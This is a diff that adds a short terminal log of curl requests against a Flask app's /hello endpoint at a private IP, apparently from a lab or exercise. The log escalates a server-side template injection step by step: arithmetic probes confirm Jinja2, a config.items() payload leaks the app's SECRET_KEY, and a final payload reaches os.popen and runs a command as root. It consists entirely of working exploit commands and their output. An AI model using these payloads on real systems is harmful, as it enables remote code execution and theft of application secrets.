@@ -1,0 +1,15 @@
+$ curl -s 'http://172.16.20.9:5000/hello?name=obol'
+<h1>Hello obol!</h1>
+
+$ curl -s 'http://172.16.20.9:5000/hello?name={{7*7}}'
+<h1>Hello 49!</h1>
+
+$ curl -s 'http://172.16.20.9:5000/hello?name={{7*%277%27}}'
+<h1>Hello 7777777!</h1>
+
+$ curl -s 'http://172.16.20.9:5000/hello?name={{config.items()}}'
+<h1>Hello dict_items([('DEBUG', True), ('SECRET_KEY', 'flask-s3cr3t-9911'), ('SESSION_COOKIE_NAME', 'session'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31))])!</h1>
+
+$ curl -s --get 'http://172.16.20.9:5000/hello' --data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+<h1>Hello uid=0(root) gid=0(root) groups=0(root)
+!</h1>
